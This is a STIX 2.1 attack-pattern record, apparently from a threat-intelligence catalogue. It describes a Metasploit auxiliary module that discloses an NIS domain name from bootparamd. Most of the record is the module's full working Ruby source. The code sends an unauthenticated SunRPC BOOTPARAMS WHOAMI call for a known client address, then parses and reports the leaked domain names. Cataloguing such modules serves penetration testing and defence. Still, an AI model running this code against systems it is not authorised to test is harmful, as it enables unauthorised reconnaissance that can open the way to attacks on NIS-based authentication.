{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84eb13dd-2e8b-4432-9809-9e6f0339b76d",
    "created": "2024-08-14T16:32:31.740549Z",
    "modified": "2024-08-14T16:32:31.740552Z",
    "name": "NIS bootparamd Domain Name Disclosure",
    "description": " This module discloses the NIS domain name from bootparamd.  You must know a client address from the target's bootparams file.  Hint: try hosts within the same network range as the target. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/nis_bootparamd_domain.rb",
            "external_id": "nis_bootparamd_domain.rb"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc1831"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc4506"
        },
        {
            "source_name": "reference",
            "url": "https://pentestmonkey.net/blog/nis-domain-name"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::SunRPC\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'NIS bootparamd Domain Name Disclosure',\n      'Description' => %q{\n        This module discloses the NIS domain name from bootparamd.\n\n        You must know a client address from the target's bootparams file.\n\n        Hint: try hosts within the same network range as the target.\n      },\n      'Author'      => [\n        'SATAN',         # boot.c\n        'pentestmonkey', # Blog post\n        'wvu'            # Metasploit module\n      ],\n      'References'  => [\n        ['URL', 'https://datatracker.ietf.org/doc/html/rfc1831'],\n        ['URL', 'https://datatracker.ietf.org/doc/html/rfc4506'],\n        ['URL', 'https://pentestmonkey.net/blog/nis-domain-name']\n      ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options([\n      OptEnum.new('PROTOCOL',  [true, 'Protocol to use', 'udp', %w[tcp udp]]),\n      OptAddress.new('CLIENT', [true, \"Client from target's bootparams file\"])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('XDRTimeout', [true, 'XDR decoding timeout', 10.0])\n    ])\n  end\n\n  def run\n    proto  = datastore['PROTOCOL']\n    client = datastore['CLIENT']\n\n    begin\n      sunrpc_create(\n        proto,  # Protocol: UDP (17)\n        100026, # Program: BOOTPARAMS (100026)\n        1       # Program Version: 1\n      )\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, 'Could not connect to portmapper')\n    rescue Rex::Proto::SunRPC::RPCError\n      fail_with(Failure::Unreachable, 'Could not connect to bootparamd')\n    end\n\n    # Flavor: AUTH_NULL (0)\n    sunrpc_authnull\n\n    # Convert ASCII to network byte order to four unsigned chars :(\n    client_addr = Rex::Socket.addr_aton(client).unpack('C4')\n\n    bootparam_whoami = Rex::Encoder::XDR.encode(\n      1,           # Address Type: IPv4-ADDR (1)\n      *client_addr # Client Address: [redacted]\n    )\n\n    begin\n      res = sunrpc_call(\n        1,               # Procedure: WHOAMI (1)\n        bootparam_whoami # Boot Parameters\n      )\n    rescue Rex::Proto::SunRPC::RPCError\n      fail_with(Failure::NotFound, 'Could not call bootparamd procedure')\n    rescue Rex::Proto::SunRPC::RPCTimeout\n      fail_with(Failure::NotVulnerable,\n                'Could not disclose NIS domain name (try another CLIENT?)')\n    ensure\n      # Shut it down! Shut it down forever!\n      sunrpc_destroy\n    end\n\n    unless res\n      fail_with(Failure::Unreachable, 'No response from server')\n    end\n\n    bootparams = begin\n      Timeout.timeout(datastore['XDRTimeout']) do\n        parse_bootparams(res)\n      end\n    rescue Timeout::Error\n      fail_with(Failure::TimeoutExpired,\n                'XDR decoding timed out (try increasing XDRTimeout?)')\n    end\n\n    if bootparams.blank?\n      fail_with(Failure::Unknown, 'Could not parse bootparams')\n    end\n\n    bootparams.each do |host, domain|\n      msg = \"NIS domain name for host #{host} (#{client}) is #{domain}\"\n\n      print_good(msg)\n\n      report_note(\n        host:  rhost,\n        port:  rport,\n        proto: proto,\n        type:  'nis.bootparamd.domain',\n        data:  msg\n      )\n    end\n  end\n\n  def parse_bootparams(res)\n    bootparams = {}\n\n    loop do\n      begin\n        # XXX: res is modified in place\n        host, domain, _, _, _, _, _ = Rex::Encoder::XDR.decode!(\n          res,\n          String,  # Client Host: [redacted]\n          String,  # Client Domain: [redacted]\n          Integer, # Address Type: IPv4-ADDR (1)\n          # One int per octet in an IPv4 address\n          Integer, # Router Address: [redacted]\n          Integer, # Router Address: [redacted]\n          Integer, # Router Address: [redacted]\n          Integer  # Router Address: [redacted]\n        )\n\n        break unless host && domain\n\n        bootparams[host] = domain\n      rescue Rex::ArgumentError\n        vprint_status(\"Finished XDR decoding at #{res.inspect}\")\n        break\n      end\n    end\n\n    bootparams\n  end\n\nend\n"
}